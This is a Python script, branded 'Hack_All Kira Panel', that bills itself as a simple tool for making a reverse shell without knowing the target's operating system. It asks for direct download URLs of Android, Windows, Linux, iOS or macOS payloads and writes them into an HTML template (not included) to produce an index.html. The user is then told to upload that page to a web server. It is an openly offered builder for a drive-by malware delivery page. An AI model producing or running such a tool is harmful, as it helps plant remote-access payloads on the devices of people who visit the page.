# -*- coding: utf-8 -*-
# usr/env/bin/python3.6
import sys
import colorama
import os
import datetime
from datetime import date
import time
# <------------------------------------------------------>
# Written By Leader_Kira with Love 
# <------------------------------------------------------>
def load():
	version = "1.0 \033[31mHack \033[96mAll \033[31m:)"
	developer = f"""
					       \033[36m╔══════════════════════════════╗\033[0m
					       \033[36m║\033[39m    Hack_All  \033[31mKira \033[39mPanel      \033[36m║\033[0m
					       \033[36m║   \033[31m>  \033[39mSoftware Developer:  \033[31m<  \033[36m║\033[0m
					       \033[36m║            \033[31mKIRA \033[96mroot\033[36m         ║\033[0m
					       \033[36m║     \033[96m \033[31m\033[1mKnown As Unkn0wn \033[36m\033[0m       \033[36m║\033[0m
					       \033[36m╚══════════════════════════════╝\033[0m

					\033[31m> \033[96mVersion:\033[39m {version}
					\033[31m> \033[96mJust a:\033[39m Simple tool that helps you to make a reverse shell without knowing OS!

					"""
	time_now = datetime.datetime.now().strftime("%H:%M:%S")
	today = date.today()
	d2 = today.strftime("%B %d, %Y")
	os.system('clear')
	design = f"""

	                                                                                                    
	                                                
	\033[35m 					          𝓚𝓲𝓻𝓪 
	\033[31m 				   		        𝓟𝓪𝓷𝓮𝓵                                                                                   
	                                                                                                    
	\033[34m                 				 {d2}
							      {developer}
	"""
	logo = (str(design))
	print(logo)
	indicator = ("\033[0m\033[31m┌──\033[96m(\033[31m\033[1mLeader\033[0m💀\033[31mKira\033[1m\033[96m)\033[0m-[\033[0m\033[39m\033[1mLightYagami\033[0m\033[96m]\n\033[31m└─\033[32m#\033[96m ")
	indicatorlogo = (str(indicator))
	AndroidInput = input('\n' + indicatorlogo + "Provide Android Payload Direct Download Url with http/https: ")
	fin = open("webcondition.html", "rt")	
	fout = open("1.html", "wt")
	for line in fin:
		fout.write(line.replace('Android_URL', str(AndroidInput)))	
	fout.close()
	fin.close()	
	choose = input('\n' + indicatorlogo + "Do You Want To add 1-Windows|2-Linux|3-Ios|4-MacOs Payload link?: ")
	if choose == "1":
		WindowsInput = input('\n' + indicatorlogo + "Provide Windows Payload Direct Download Url with http/https: ")
		fin = open("1.html", "rt")
		fout = open("index.html", "wt")
		for line in fin:
			fout.write(line.replace('Windows_URL', str(WindowsInput)))
		fout.close()
		fin.close()
	elif choose == "2":
		LinuxInput = input('\n' + indicatorlogo + "Provide Linux Payload Direct Download Url with http/https: ")
		fin = open("1.html", "rt")
		fout = open("index.html", "wt")
		for line in fin:
			fout.write(line.replace('Linux_URL', str(LinuxInput)))
		fout.close()		
		fin.close()
	elif choose == "3":
		IOSInput = input('\n' + indicatorlogo + "Provide IOS Device Direct Download Url with http/https: ")
		fin = open("1.html", "rt")
		fout = open("index.html", "wt")		
		for line in fin:
			fout.write(line.replace('IOS_URL', str(IOSInput)))
		fout.close()			
		fin.close()
	elif choose == "4":
		MacOSInput = input('\n' + indicatorlogo + "Provide MacOS Direct Download Url with http/https: ")
		fin = open("1.html", "rt")
		fout = open("index.html", "wt")		
		for line in fin:
			fout.write(line.replace('MacOS_URL', str(MacOSInput)))
		fout.close()		
		fin.close()
	else:
		print("Please choose right option")	
		time.sleep(3)
		os.system('clear')
		load()
	os.system('clear')
	os.system('rm 1.html')
	print("Just Upload Your index.html to web server and enjoy")
	time.sleep(5)
	os.system('clear')
load()
